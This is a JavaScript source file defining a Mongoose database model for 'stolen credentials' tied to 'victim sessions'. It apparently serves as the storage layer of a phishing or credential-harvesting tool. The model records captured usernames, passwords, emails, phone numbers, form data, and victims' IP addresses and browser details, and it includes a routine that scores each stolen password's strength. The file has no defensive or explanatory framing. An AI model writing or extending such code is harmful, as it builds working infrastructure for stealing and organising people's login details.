const mongoose = require('mongoose');

const StolenCredentialSchema = new mongoose.Schema({
  sessionId: { type: mongoose.Schema.Types.ObjectId, ref: 'VictimSession', required: true, index: true },
  sessionIdStr: { type: String },
  source: { 
    type: String,
    default: 'unknown'
  },
  username: { type: String },
  password: { type: String },
  email: { type: String },
  phone: { type: String },
  url: { type: String },
  pageTitle: { type: String },
  formType: { type: String },
  fieldData: { type: mongoose.Schema.Types.Mixed },
  additionalData: { type: mongoose.Schema.Types.Mixed },
  ipAddress: { type: String },
  userAgent: { type: String },
  capturedAt: { type: Date, default: Date.now },
  strength: { type: String, enum: ['weak', 'medium', 'strong', 'very-strong', 'unknown'], default: 'unknown' },
  reused: { type: Boolean, default: false },
  analyzed: { type: Boolean, default: false }
}, { timestamps: true });

StolenCredentialSchema.index({ capturedAt: -1 });
StolenCredentialSchema.index({ username: 1 });
StolenCredentialSchema.index({ url: 1 });

// Virtual for password strength analysis
StolenCredentialSchema.methods.analyzeStrength = function() {
  if (!this.password || this.password.length < 1) return 'unknown';
  const pwd = this.password;
  let score = 0;
  if (pwd.length >= 8) score++;
  if (pwd.length >= 12) score++;
  if (/[a-z]/.test(pwd)) score++;
  if (/[A-Z]/.test(pwd)) score++;
  if (/[0-9]/.test(pwd)) score++;
  if (/[^a-zA-Z0-9]/.test(pwd)) score++;
  if (score <= 2) return 'weak';
  if (score <= 3) return 'medium';
  if (score <= 5) return 'strong';
  return 'very-strong';
};

module.exports = mongoose.model('StolenCredential', StolenCredentialSchema);